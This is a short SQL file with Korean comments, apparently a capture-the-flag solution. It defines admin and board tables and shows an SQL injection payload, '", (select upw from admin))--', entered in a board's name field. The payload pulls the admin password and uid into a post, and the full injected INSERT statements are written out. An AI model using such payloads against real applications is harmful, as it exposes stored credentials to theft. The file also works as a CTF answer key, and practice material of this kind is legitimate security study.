CREATE TABLE admin (uid STRING, upw STRING);
CREATE TABLE board (name STRING, text STRING);
INSERT INTO admin (uid, upw) VALUES ('admin', [**FLAG**]);

--여기서 uid와 upw를 찾기 위해
--Name과 Text값이 입력되는 부분에서 name에
--1. ", (select upw from admin))-- 을 적어서 admin 테이블의 upw값을 찾는다. 
--2. ", (select uid from admin))-- 을 적어서 admin 테이블의 uid값을 찾는다.

--1. 사용시
insert into board (name, text) values ("", (select upw from admin))--", "");
--2. 사용시
insert into board (name, text) values ("", (select uid from admin))--", "");

